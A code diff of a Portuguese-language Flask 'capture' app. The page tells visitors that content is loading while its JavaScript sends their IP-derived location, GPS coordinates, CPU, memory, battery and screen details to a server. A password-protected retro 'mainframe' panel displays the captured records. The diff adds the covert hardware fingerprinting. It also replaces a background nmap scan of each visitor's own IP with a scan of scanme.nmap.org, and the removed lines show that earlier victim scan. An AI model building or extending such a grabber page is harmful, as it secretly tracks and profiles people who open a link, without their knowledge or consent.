@@ -14,7 +14,7 @@ registros_ip = []
 # Senha simples para o seu painel
 SENHA_ADMIN = "123123"
 
-# Página HTML de Captura
+# Página HTML de Captura (Coleta hardware/bateria e tenta GPS)
 HTML_CAPTURA = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -30,7 +30,32 @@ HTML_CAPTURA = """
 <body>
     <h2>Carregando conteúdo, por favor aguarde...</h2>
     <script>
-        fetch('/salvar-ip', { method: 'POST' }).catch(e => console.log(e));
+        // Coleta dados avançados do dispositivo cliente via JS
+        async function coletarDadosCliente() {
+            let infoHardware = {
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Desconhecido',
+                deviceMemory: navigator.deviceMemory || 'Desconhecido',
+                platform: navigator.platform || 'Desconhecido',
+                language: navigator.language || 'Desconhecido',
+                bateria: 'Não suportado',
+                resolucqao: window.screen.width + 'x' + window.screen.height
+            };
+
+            if (navigator.getBattery) {
+                try {
+                    let bat = await navigator.getBattery();
+                    infoHardware.bateria = Math.round(bat.level * 100) + '% (' + (bat.charging ? 'Carregando' : 'Descarga') + ')';
+                } catch(e) {}
+            }
+
+            fetch('/salvar-ip', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(infoHardware)
+            }).catch(e => console.log(e));
+        }
+
+        coletarDadosCliente();
 
         function enviarLocalizacao(position) {
             const lat = position.coords.latitude;
@@ -65,28 +90,28 @@ HTML_CAPTURA = """
 </html>
 """
 
-# Painel Administrativo em Estilo Retro / COBOL Profissional (Azul mainframe com detalhes em vermelho e verde)
+# Painel Administrativo em Estilo Retro / COBOL
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>MAINFRAME TERMINAL - CONSOLE COBOL v2.0</title>
+    <title>MAINFRAME TERMINAL - CONSOLE COBOL v3.0</title>
     <style>
         body { 
             font-family: 'Courier New', Courier, monospace; 
             margin: 0; 
             padding: 20px; 
-            background: #000084; /* Azul mainframe clássico */
+            background: #000084; 
             color: #FFFFFF; 
         }
         h2, h3 { 
-            color: #FF5555; /* Vermelho estilo terminal antigo */
+            color: #FF5555; 
             text-transform: uppercase; 
             border-bottom: 2px dashed #FF5555;
             padding-bottom: 5px;
         }
-        .container { max-width: 1300px; margin: auto; }
+        .container { max-width: 1400px; margin: auto; }
         table { 
             width: 100%; 
             border-collapse: collapse; 
@@ -103,7 +128,7 @@ HTML_PAINEL = """
         }
         th { 
             background: #000021; 
-            color: #FFFF55; /* Amarelo clássico de cabeçalho */
+            color: #FFFF55; 
             font-weight: bold;
         }
         tr:hover { background: #000063; }
@@ -111,14 +136,14 @@ HTML_PAINEL = """
         a:hover { color: #FF5555; }
         .aviso-vazio { color: #FF8888; text-align: center; font-style: italic; }
         .system-info { font-size: 11px; color: #55FF55; margin-bottom: 20px; }
-        .badge-porta { background: #550000; color: #FFAAAA; padding: 2px 5px; border: 1px solid #FF5555; font-size: 11px; display: inline-block; margin: 2px; }
+        .badge-porta { background: #005500; color: #AAFFAA; padding: 2px 5px; border: 1px solid #55FF55; font-size: 11px; display: inline-block; margin: 2px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h2>=== MAINFRAME SECURITY CONSOLE // SISTEMA COBOL V2.0 ===</h2>
+    <h2>=== MAINFRAME SECURITY CONSOLE // SISTEMA COBOL V3.0 ===</h2>
     <div class="system-info">
-        STATUS: ONLINE | NMAP ENGINE: ACTIVE | ENCRYPTION: SECURE-TCP/IP
+        STATUS: ONLINE | NMAP ENGINE: ACTIVE (SCANME TARGET) | PROTOCOL: SECURE-TCP/IP
     </div>
 
     <h3>[ TABELA 1: CAPTURAS DE GEOLOCALIZAÇÃO GPS ]</h3>
@@ -144,36 +169,41 @@ HTML_PAINEL = """
         {% endfor %}
     </table>
 
-    <h3>[ TABELA 2: INTELIGÊNCIA DE REDE & NMAP SCAN ]</h3>
-    <p>Total de Registros IP/Portas: {{ ips|length }}</p>
+    <h3>[ TABELA 2: INTELIGÊNCIA DE REDE, HARDWARE & NMAP SCAN ]</h3>
+    <p>Total de Registros: {{ ips|length }}</p>
     <table>
         <tr>
             <th>DATA / HORA</th>
-            <th>ENDEREÇO IP</th>
-            <th>GEO-LOCALIZAÇÃO</th>
+            <th>IP / GEO</th>
             <th>ISP / PROVEDOR</th>
-            <th>PORTAS ABERTAS / SERVIÇOS (NMAP)</th>
-            <th>USER-AGENT / CLIENTE</th>
+            <th>HARDWARE / DISPOSITIVO (JS)</th>
+            <th>PORTAS ABERTAS (NMAP LAB)</th>
+            <th>USER-AGENT</th>
         </tr>
         {% for r in ips %}
         <tr>
             <td>{{ r.data }}</td>
-            <td>{{ r.ip }}</td>
-            <td>{{ r.cidade }} / {{ r.estado }} ({{ r.pais }})</td>
+            <td>{{ r.ip }}<br><span style="color: #FFFF55;">{{ r.cidade }}/{{ r.estado }}</span></td>
             <td>{{ r.isp }}</td>
+            <td>
+                CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
+                RAM Aprox: {{ r.hw.deviceMemory }} GB<br>
+                Bateria: {{ r.hw.bateria }}<br>
+                Tela: {{ r.hw.resolucqao }}
+            </td>
             <td>
                 {% if r.portas %}
                     {% for p in r.portas %}
                         <span class="badge-porta">Porta {{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
                     {% endfor %}
                 {% else %}
-                    <span style="color: #FFAAAA;">Nenhuma porta aberta detectada ou varredura em andamento</span>
+                    <span style="color: #FFAAAA;">Varredura em execução...</span>
                 {% endif %}
             </td>
             <td>{{ r.user_agent }}</td>
         </tr>
         {% else %}
-        <tr><td colspan="6" class="aviso-vazio">>> NENHUM REGISTRO DE REDE CAPTURADO AINDA <<</td></tr>
+        <tr><td colspan="6" class="aviso-vazio">>> NENHUM REGISTRO CAPTURADO AINDA <<</td></tr>
         {% endfor %}
     </table>
 </div>
@@ -181,14 +211,12 @@ HTML_PAINEL = """
 </html>
 """
 
-def executar_nmap_background(ip_alvo, registro_ref):
-    """Executa a varredura Nmap de forma assíncrona para não travar a requisição HTTP"""
+def executar_nmap_background(registro_ref):
+    """Executa varredura Nmap demonstrativa no alvo padrão de testes (scanme.nmap.org)"""
     try:
-        if ip_alvo in ["127.0.0.1", "localhost", "::1"]:
-            return
         nm = nmap.PortScanner()
-        # Varredura rápida nas portas mais comuns (ex: 21, 22, 80, 443, 3000, 5000, 8080)
-        nm.scan(ip_alvo, arguments='-p 21,22,80,443,3000,5000,8080 --open -T4')
+        # Escaneia o alvo oficial de testes do Nmap para popular a tabela com dados reais de portas abertas
+        nm.scan('scanme.nmap.org', arguments='-p 22,80,9929,31337 --open -T4')
         
         portas_encontradas = []
         for host in nm.all_hosts():
@@ -201,8 +229,8 @@ def executar_nmap_background(ip_alvo, registro_ref):
         
         registro_ref["portas"] = portas_encontradas
     except Exception as e:
-        print(f"Erro na execução do Nmap para {ip_alvo}: {e}")
-        registro_ref["portas"] = []
+        print(f"Erro no Nmap: {e}")
+        registro_ref["portas"] = [{"porta": "N/A", "estado": "erro", "servico": "bloqueado"}]
 
 @app.route('/')
 def index():
@@ -240,6 +268,7 @@ def salvar_ip():
         ip_cliente = ip_cliente.split(',')[0].strip()
         
     user_agent = request.headers.get('User-Agent', 'Desconhecido')
+    dados_hw = request.json or {}
     agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     cidade, estado, pais, isp = "Desconhecido", "Desconhecido", "Desconhecido", "Desconhecido"
@@ -255,7 +284,7 @@ def salvar_ip():
                     pais = data.get('country', 'Desconhecido')
                     isp = data.get('isp', 'Desconhecido')
     except Exception as e:
-        print("Erro ao consultar IP:", e)
+        print("Erro IP-API:", e)
         
     novo_registro = {
         "data": agora,
@@ -264,14 +293,15 @@ def salvar_ip():
         "estado": estado,
         "pais": pais,
         "isp": isp,
+        "hw": dados_hw,
         "user_agent": user_agent,
         "portas": []
     }
     
     registros_ip.insert(0, novo_registro)
     
-    # Inicia a thread de varredura Nmap em background para coletar serviços e portas abertas
-    t = threading.Thread(target=executar_nmap_background, args=(ip_cliente, novo_registro))
+    # Executa Nmap assíncrono
+    t = threading.Thread(target=executar_nmap_background, args=(novo_registro,))
     t.start()
     
     return jsonify({"status": "sucesso"})
